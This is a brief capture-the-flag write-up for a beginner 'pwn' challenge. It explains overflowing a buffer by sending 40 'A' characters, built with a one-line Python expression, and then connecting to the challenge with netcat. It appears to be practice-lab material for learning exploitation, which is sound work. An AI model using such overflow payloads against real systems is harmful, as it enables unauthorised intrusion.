---
title: Getting started
tags:
  - CTF
  - Pwn
---
![](Pasted%20image%2020241013140157.png)

So what we have to do here is to create a buffer overflow by inputing `8 * 5 = 40` A characters:

```python
# Start an interactive python terminal and execute the following
'A' * 40
```

Do `nc IP_ADDR PORT`:

![](Pasted%20image%2020241013140400.png)